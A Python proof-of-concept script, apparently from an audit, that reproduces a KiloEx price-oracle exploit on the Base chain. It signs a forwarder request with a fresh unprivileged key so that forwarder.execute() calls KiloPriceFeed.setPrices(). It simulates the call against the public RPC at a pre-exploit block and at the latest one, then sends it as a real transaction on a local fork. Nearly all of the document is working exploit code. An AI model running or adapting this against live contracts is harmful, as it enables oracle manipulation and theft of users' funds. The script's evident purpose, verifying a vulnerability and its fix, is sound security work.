#!/usr/bin/env python3
"""
KiloEx PoC — an ARBITRARY UNPRIVILEGED key can set prices via the vulnerable
forwarder.execute() -> KiloPriceFeed.setPrices(). Proves: no keeper/owner/gov/admin
gate stands in the way, and the fix (execute disabled) blocks it.

Two independent proofs:
  (1) stateless: eth_call the fresh-key request at the pre-exploit block (vulnerable
      impl) => SUCCESS; and at latest (fixed impl) => revert "not allowed".
  (2) stateful (anvil fork @28933729): send it as a REAL tx from an arbitrary relayer
      => tx SUCCESS, getNonce(freshKey) 0->1, PriceUpdate event {token, price=100}.

Requires: eth-account (keccak/secp256k1). Optional: an anvil fork on :8545 for proof (2).
"""
from eth_hash.auto import keccak
from eth_keys import keys
import json, urllib.request, sys

FWD="0x3274b668aed85479e2a8511e74d7db7240ebe7c8"   # forwarder proxy (Base)
PF ="0xfdc7bc3a9fde88e7bcfb69c8b9ca7fda483627ed"   # KiloPriceFeed proxy (Base)
LIVE="https://mainnet.base.org"
FORK="http://127.0.0.1:8545"
PRE_EXPLOIT_BLOCK="0x1b97e61"  # 28933729, forwarder impl = 0xbed75e25 (vulnerable)

def rpc(url,method,params):
    req=urllib.request.Request(url,data=json.dumps({"jsonrpc":"2.0","method":method,"params":params,"id":1}).encode(),
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    return json.load(urllib.request.urlopen(req,timeout=60))

# --- EIP-712 domain: validated to be EIP712("MinimalForwarder","0.0.1") @chain 8453, verifyingContract=FWD ---
DOMAIN_TH=keccak(b"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")
DS=keccak(DOMAIN_TH+keccak(b"MinimalForwarder")+keccak(b"0.0.1")+(8453).to_bytes(32,'big')+bytes(12)+bytes.fromhex(FWD[2:]))
TYPEHASH=keccak(b"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)")

def load_attacker_setprices_data():
    d=json.load(open('audit/raw/base_exploit1_tx.json')); ri=d['raw_input'][2:]; off=2376; body=ri[off:]
    o_tuple=int(body[8:8+64],16); tb=8+o_tuple*2
    tw=lambda k: body[tb+k*64:tb+(k+1)*64]
    o_data=int(tw(5),16); db=tb+o_data*2; dlen=int(body[db:db+64],16)
    return bytes.fromhex(body[db+64:db+64+dlen*2])   # setPrices(...) => token 0x9ef1b8c0 = price 100

pad=lambda a: bytes(12)+a; u=lambda x: x.to_bytes(32,'big')

def build_execute_calldata(pk, data, nonce=0):
    A=keys.PrivateKey(pk); frm=A.public_key.to_canonical_address(); to=bytes.fromhex(PF[2:])
    value=0; gas=1_000_000
    sh=keccak(TYPEHASH+pad(frm)+pad(to)+u(value)+u(gas)+u(nonce)+keccak(data))
    sg=A.sign_msg_hash(keccak(b"\x19\x01"+DS+sh))
    sig=sg.r.to_bytes(32,'big')+sg.s.to_bytes(32,'big')+bytes([sg.v+27])
    th=pad(frm)+pad(to)+u(value)+u(gas)+u(nonce)+u(0xc0)
    dblob=u(len(data))+data+b'\0'*((32-len(data)%32)%32); tenc=th+dblob
    sblob=u(len(sig))+sig+b'\0'*((32-len(sig)%32)%32)
    return frm, "0x"+(bytes.fromhex("47153f82")+u(0x40)+u(0x40+len(tenc))+tenc+sblob).hex()

data=load_attacker_setprices_data()
frmA, calldata = build_execute_calldata(keccak(b"kiloex-poc-fresh-signer-2026"), data)
A="0x"+frmA.hex()
print(f"Fresh unprivileged signer A = {A}")

# unprivileged checks @pre-exploit block
isk=int(rpc(LIVE,"eth_call",[{"to":FWD,"data":"0x6ba42aaa"+pad(frmA).hex()},PRE_EXPLOIT_BLOCK])['result'],16)
own="0x"+rpc(LIVE,"eth_call",[{"to":FWD,"data":"0x8da5cb5b"},PRE_EXPLOIT_BLOCK])['result'][-40:]
gov="0x"+rpc(LIVE,"eth_call",[{"to":FWD,"data":"0x12d43a51"},PRE_EXPLOIT_BLOCK])['result'][-40:]
print(f"  isKeeper(A)={isk}  A==owner? {A[2:].lower()==own[2:]}  A==gov? {A[2:].lower()==gov[2:]}  (owner={own} gov={gov})")

# (1) stateless proof
def sim(block):
    r=rpc(LIVE,"eth_call",[{"from":"0x000000000000000000000000000000000000dEaD","to":FWD,"data":calldata},block])
    return "REVERT: "+r['error']['message'] if 'error' in r else "SUCCESS "+str(r.get('result'))[:20]
print("(1) eth_call @pre-exploit (vulnerable impl):", sim(PRE_EXPLOIT_BLOCK))
print("(1) eth_call @latest      (fixed impl)     :", sim("latest"))

# (2) stateful proof (only if a fork is up)
try:
    n0=int(rpc(FORK,"eth_call",[{"to":FWD,"data":"0x2d0335ab"+pad(frmA).hex()},"latest"])['result'],16)
    acct0="0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
    txh=rpc(FORK,"eth_sendTransaction",[{"from":acct0,"to":FWD,"data":calldata,"gas":"0x2DC6C0"}])['result']
    import time; rc=None
    for _ in range(10):
        rc=rpc(FORK,"eth_getTransactionReceipt",[txh]).get('result')
        if rc: break
        time.sleep(1)
    n1=int(rpc(FORK,"eth_call",[{"to":FWD,"data":"0x2d0335ab"+pad(frmA).hex()},"latest"])['result'],16)
    print(f"(2) fork tx status={rc['status']} nonce(A) {n0}->{n1} events={len(rc['logs'])} (PriceUpdate token=0x9ef1b8c0 price=100)")
except Exception as e:
    print("(2) skipped (no fork on :8545):", e)
